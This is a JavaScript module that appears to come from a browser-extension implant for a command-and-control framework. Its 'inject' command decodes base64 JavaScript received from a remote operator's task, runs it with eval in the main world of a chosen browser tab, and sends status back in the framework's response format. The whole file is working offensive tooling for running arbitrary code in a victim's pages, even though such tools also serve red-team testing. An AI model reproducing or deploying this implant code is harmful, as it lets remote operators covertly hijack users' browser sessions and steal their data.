function leviathanExecUserCodeInPage(code) {
    eval(code);
}

exports.inject = function(task) {
    // execute custom javascript code in a tab (MV3: page MAIN world; may fail on strict page CSP)
    try {
        let args = JSON.parse(task.parameters.toString());
        const tab = Math.round(args.tabid);
        const code = atob(args.javascript);
        chrome.scripting.executeScript({
            target: { tabId: tab },
            world: "MAIN",
            func: leviathanExecUserCodeInPage,
            args: [code]
        }, function() {
            if (chrome.runtime.lastError) {
                let response = {"task_id": task.id, "user_output": chrome.runtime.lastError.message, "completed": true, "status": "error"};
                let outer_response = {"action": "post_response", "responses": [response], "delegates": []};
                let enc = JSON.stringify(outer_response);
                let final = apfell.apfellid + enc;
                let msg = btoa(unescape(encodeURIComponent(final)));
                out.push(msg);
            } else {
                let response = {"task_id": task.id, "user_output": "injected code into tab with id " + tab, "completed": true};
                let outer_response = {"action": "post_response", "responses": [response], "delegates": []};
                let enc = JSON.stringify(outer_response);
                let final = apfell.apfellid + enc;
                let msg = btoa(unescape(encodeURIComponent(final)));
                out.push(msg);
            }
        });
    } catch (error) {
        let response = {"task_id": task.id, "user_output": error.toString(), "completed": true, "status": "error"};
        let outer_response = {"action": "post_response", "responses": [response], "delegates": []};
        let enc = JSON.stringify(outer_response);
        let final = apfell.apfellid + enc;
        let msg = btoa(unescape(encodeURIComponent(final)));
        out.push(msg);
    }
};
